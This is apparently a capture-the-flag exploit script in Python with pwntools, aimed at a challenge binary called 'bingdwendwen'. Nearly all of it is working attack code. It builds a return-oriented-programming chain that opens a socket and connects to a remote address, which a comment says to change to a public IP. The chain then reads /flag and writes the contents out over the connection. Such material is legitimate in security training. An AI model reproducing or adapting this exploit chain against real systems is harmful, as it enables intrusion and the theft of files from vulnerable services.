# -*- encoding: utf-8 -*-
from pwn import *

p = process('bingdwendwen')

context.update(arch="amd64", endian="little")

pop_rdi = 0x0000000000401356
pop_rsi = 0x0000000000401358
pop_rax = 0x000000000040135a
pop_rcx = 0x000000000040135d
pop_rdx = 0x0000000000401354
sys_ret = 0x0000000000401351
bss_addr = 0x403700
push_rax_pop_rcx = 0x000000000040135c
mov_rdi_rcx = 0x000000000040135f


"""
s = socket(2, 1, 6)
connect(s, &addr, 0x10)
open(/flag)
read(/flag)
write(socket)
"""

payload = flat({
    0x1d0: [
        # socket
        p16(0x2), # AF_INET
        p16(10001,endian="big"), # PORT
        p32(0x7f000001, endian="big"), # ip 127.0.0.1，修改为公网IP
        p64(0), # padding
        "/flag".ljust(8, "\x00")
    ],
    0x10: [
        pop_rdi, 2,
        pop_rsi, 1,
        pop_rdx, 6,
        pop_rax, 41,
        sys_ret, # socket(2, 1, 6)

        push_rax_pop_rcx,
        mov_rdi_rcx,
        pop_rsi, bss_addr+0x1d0,
        pop_rdx, 0x10,
        pop_rax, 42,
        sys_ret, # connect(s, &addr, 0x10)

        pop_rdi, 
        bss_addr+0x1e0,
        pop_rsi, 0,
        pop_rax, 2, # open
        sys_ret,

        push_rax_pop_rcx,
        mov_rdi_rcx,
        pop_rsi,
        bss_addr+0x200,
        pop_rdx,
        0x30, # read
        pop_rax, 0,
        sys_ret,

        pop_rdi, 0,
        pop_rsi, bss_addr+0x200,
        pop_rdx, 0x30,
        pop_rax, 1, # write
        sys_ret
    ]

})

gdb.attach(p)
p.sendlineafter("Hello,Do You Like Bing Dwen Dwen?\n", payload)

p.interactive()
